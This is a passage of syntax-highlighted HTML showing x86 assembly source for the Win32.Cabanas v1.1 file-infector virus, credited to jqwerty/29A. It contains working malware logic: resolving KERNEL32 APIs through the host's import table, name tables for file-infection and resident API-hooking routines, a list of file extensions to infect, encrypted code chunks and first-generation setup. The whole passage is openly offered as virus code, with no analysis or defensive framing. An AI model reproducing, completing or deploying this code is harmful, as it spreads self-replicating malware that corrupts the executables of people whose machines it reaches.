        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MyGetProcAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandleW</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;this function retrieves the base address/module handle</span><span class="sc0">
                        </span><span class="sc1">;  of KERNEL32 module previosly loaded to memory asumin</span><span class="sc0">
                        </span><span class="sc1">;  the GetModuleHandleW API was found in the import</span><span class="sc0">
                        </span><span class="sc1">;  table of the host</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;this dynamic variable will hold an RVA pointer to the GetModuleHandleW API in the IAT</span><span class="sc0">
</span><span class="sc5">ddGetModuleHandleW</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MyGetModuleHandle</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandleA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;this function retrieves the base address/module handle</span><span class="sc0">
                        </span><span class="sc1">;  of KERNEL32 module previosly loaded to memory asumin</span><span class="sc0">
                        </span><span class="sc1">;  the GetModuleHandleA API was found in the import</span><span class="sc0">
                        </span><span class="sc1">;  table of the host</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">;this dynamic variable will hold an RVA pointer to the GetModuleHandleA API in the IAT</span><span class="sc0">
</span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandle</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc1">;this function retrieves the base adress of KERNEL32</span><span class="sc0">
                        </span><span class="sc1">;on entry:</span><span class="sc0">
                        </span><span class="sc1">;  ECX = RVA pointer to GetModuleHandle(A/W) in the IAT</span><span class="sc0">
                        </span><span class="sc1">;  TOS+04h (Arg1): pointer to KERNEL32 module name</span><span class="sc0">
                        </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                        </span><span class="sc1">;on exit:</span><span class="sc0">
                        </span><span class="sc1">;  Zero flag set = Base adress not found</span><span class="sc0">
                        </span><span class="sc1">;  Zero flag clear = Base adress found</span><span class="sc0">
                        </span><span class="sc1">;  EAX = KERNEL32 base adress</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;set zero flag</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;get return adress</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Arg1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;push return adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get actual host base adress</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_MyGetModuleHandle</span><span class="sc0">           </span><span class="sc1">;if not valid GetModuleHandle(A/W) RVA, jump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;call GetModuleHandle(A/W) API</span><span class="sc0">
 </span><span class="sc5">chk_0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_MyGetModuleHandle</span><span class="sc0">           </span><span class="sc1">;if any error, not found, jump</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">end_MyGetModuleHandle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandleX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;this function retrieves the KERNEL32 base adress</span><span class="sc0">
                        </span><span class="sc1">;  via an undocumented method. This function procedure</span><span class="sc0">
                        </span><span class="sc1">;  doesnt work in Winblowz NT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ptrForwarderChain</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">ddForwarderChain</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">chk_0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MyGetModuleHandle</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_ebp2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">get_ebp</span><span class="sc0">         </span><span class="sc1">;clear carry (unicode version)</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;clear set (ansi version)</span><span class="sc0">

</span><span class="sc5">get_ebp</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_ebp</span><span class="sc0">

</span><span class="sc5">m_ebp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">v_end</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;virus code ends here</span><span class="sc0">

</span><span class="sc1">;uninitialized data     ;these variablez will be adressed in memory, but dont waste space in the file</span><span class="sc0">

</span><span class="sc5">ImportHdr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;import table RVA of current host</span><span class="sc0">
</span><span class="sc5">pCodeTable</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to encrypted chunkz of code    ;these 2 variables may overlap.</span><span class="sc0">
                        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                           </span><span class="sc1">;one is used at instalation stage,</span><span class="sc0">
</span><span class="sc5">pHandlez</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to top of Handlez table        ;the other one used when resident.</span><span class="sc0">
</span><span class="sc5">phost_hdr</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to actual base adress of host</span><span class="sc0">
</span><span class="sc5">pcode_start</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to start of virus code/data in memory</span><span class="sc0">
</span><span class="sc5">K32Mod</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;KERNEL32 base adress</span><span class="sc0">
</span><span class="sc5">ddGetProcAddress2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;adress where GetProcAddress API will be stored         ;these 2 variables may overlap.</span><span class="sc0">
                        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                                           </span><span class="sc1">;one is used at instalation stage,</span><span class="sc0">
</span><span class="sc5">pPathNamez</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to top of PathNamez table                      ;the other one used when resident.</span><span class="sc0">
</span><span class="sc5">pNewAPIs</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to new API entry in the jump table</span><span class="sc0">
</span><span class="sc5">uni_or_ansi</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;needed to diferentiate unicode from ansi stringz</span><span class="sc0">

</span><span class="sc5">FunctionAdressez</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;this dwordz will hold the API function adressez used by the virus</span><span class="sc0">

</span><span class="sc5">ddCreateFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCreateFileW</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindClose</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindFirstFileW</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindNextFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFindNextFileW</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileAttributesW</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddCloseHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ddCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddMapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFilePointer</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetEndOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddSetFileTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetCurrentProcess</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddGetModuleFileName</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddWriteProcessMemory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddWideCharToMultiByte</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddVirtualAlloc</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">v_stringz</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;the API namez used by the virus are decrypted here</span><span class="sc0">

</span><span class="sc5">vszKernel32</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetModuleHandleA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetModuleHandleW</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Exts</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'fxEtcR'</span><span class="sc0">        </span><span class="sc1">;list of extensionz to infect</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FunctionNamez2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;resident API namez, needed for dynamically API hookin</span><span class="sc0">

</span><span class="sc5">vszGetProcAddress</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetFileAttributesW</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetFileAttributesW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMoveFileExA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MoveFileExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMoveFileExW</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MoveFileExW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vsz_lopen</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'_lopen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCopyFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCopyFileW</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CopyFileW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszOpenFile</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'OpenFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMoveFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MoveFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMoveFileW</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MoveFileW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCreateProcessA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCreateProcessW</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateProcessW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FunctionNamez</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">vszCreateFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCreateFileW</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindClose</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindFirstFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindFirstFileW</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindNextFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszFindNextFileW</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFileAttributesW</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileAttributesW'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">non_res</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;non-resident API namez</span><span class="sc0">

</span><span class="sc5">vszCloseHandle</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszCreateFileMappingA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszMapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszUnmapViewOfFile</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFilePointer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetEndOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszSetFileTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetWindowsDirectory</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetSystemDirectory</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetCurrentProcess</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetCurrentProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszGetModuleFileName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleFileNameA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszWriteProcessMemory</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszWideCharToMultiByte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WideCharToMultiByte'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vszVirtualAlloc</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EndOfFunctionNamez</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">szCopyright</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) Win32.Cabanas v1.1 by jqwerty/29A."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">non_res</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">v_end2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">NewAPItable</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nAPIS</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FindData</span><span class="sc0">        </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;this structure will hold data retrieved trhu FindFirst/Next APIz</span><span class="sc0">

</span><span class="sc5">PathName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;filenamez will be stored here for infection</span><span class="sc0">

</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;end of virus virtual memory space (in PE filez)</span><span class="sc0">

</span><span class="sc5">Handlez</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nHANDLEZ</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;Handlez table</span><span class="sc0">

</span><span class="sc5">PathNamez</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">nPATHNAMEZ</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;PathNamez table</span><span class="sc0">

</span><span class="sc5">virtual_end2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;end of virus virtual memory space (in flat memory)</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;this routine will be called only once from the first generation sample,</span><span class="sc0">
                    </span><span class="sc1">;it initializes some variables needed by the virus in the first run.</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ref</span><span class="sc0">
   </span><span class="sc5">ref</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">add_1st_val</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">code_table</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">xor_2nd_val</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">code_table</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_table</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
